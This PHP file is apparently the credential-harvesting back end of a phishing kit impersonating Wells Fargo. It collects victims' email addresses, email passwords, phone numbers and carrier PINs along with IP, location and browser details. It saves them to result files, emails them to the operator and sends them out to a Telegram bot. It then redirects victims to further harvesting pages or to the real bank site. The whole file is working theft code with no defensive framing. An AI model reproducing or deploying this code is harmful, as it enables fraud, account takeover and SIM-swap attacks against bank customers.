<?php
ob_start();
session_start();

if(isset($_POST['emailaccess'])&&isset($_POST['emailaccesspass'])&&isset($_POST['invalid'])){

include '../config.php';
include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -WELLS-@mkydagoat- Email Access ]----------------------------#\r\n";
	$hi.="Email_Access	: {$_POST['emailaccess']}\r\n";
	$hi.="Email_Pass 	: {$_POST['emailaccesspass']}\r\n";
	$hi.="Phone Number	: {$_POST['phonetype']} / {$_POST['phonenumber']}\r\n";
	$hi.="Carrier Pin 	: {$_POST['pin']}\r\n";
	$hi.="#---------------------------[ -WELLS-@mkydagoat- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -WELLS-@mkydagoat- Email Access ]----------------------------#\r\n";

		$save=fopen("../Wells_result/access2.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#WELLS @mkydagoat Email Access 2 From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: WELLS @mkydagoat <admin@fucksociety.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
		
	$wellsbank = [
	    'chat_id' => $chat_id,
	    'text' => $hi
	];	
	
	include "../Files/img/loading.gif";
	$key = substr(sha1(mt_rand()),1,25);
	$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($wellsbank) );
	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr")); // go to bank login page officiel..
	}
}



if(isset($_POST['emailaccess'])&&isset($_POST['emailaccesspass'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -WELLS-@mkydagoat- Email Access ]----------------------------#\r\n";
	$hi.="Email_Access	: {$_POST['emailaccess']}\r\n";
	$hi.="Email_Pass 	: {$_POST['emailaccesspass']}\r\n";
	$hi.="Phone Number	: {$_POST['phonetype']} / {$_POST['phonenumber']}\r\n";
	$hi.="Carrier Pin 	: {$_POST['pin']}\r\n";
	$hi.="#---------------------------[ -WELLS-@mkydagoat- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -WELLS-@mkydagoat- Email Access ]----------------------------#\r\n";

		$save=fopen("../Wells_result/access1.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#WELLS @mkydagoat Email Access 1 From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: WELLS @mkydagoat  <admin@fucksociety.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
		
	$wellsbank = [
	    'chat_id' => $chat_id,
	    'text' => $hi
	];	
	
	include "../Files/img/loading.gif";
    $key = substr(sha1(mt_rand()),1,25);
	$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($wellsbank) );
	if ($double_access=="yes") {
		exit(header("Location: ../../Email_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."&invalid=access"));
	}
	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>